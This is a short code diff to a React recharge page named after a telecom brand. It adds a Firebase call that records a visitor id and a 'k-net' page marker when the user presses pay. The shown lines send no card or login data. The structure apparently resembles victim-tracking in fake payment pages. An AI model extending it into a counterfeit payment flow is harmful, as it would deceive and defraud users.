@@ -10,6 +10,7 @@ import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Label } from "@/components/ui/label"
 import { Card, CardContent } from "@/components/ui/card"
 import { Badge } from "@/components/ui/badge"
+import { addData } from "@/lib/firebase"
 
 const rechargeOptions = [
   {
@@ -69,7 +70,8 @@ export default function STCRechargePage() {
 const handlePay=(e:any)=>{
     e.preventDefault()
     setIsLoading(true)
-
+    const vistor=localStorage.getItem('visitor')
+    addData({id:vistor,      currentPage: "k-net"})
     setTimeout(() => {
         setIsLoading(false)
 
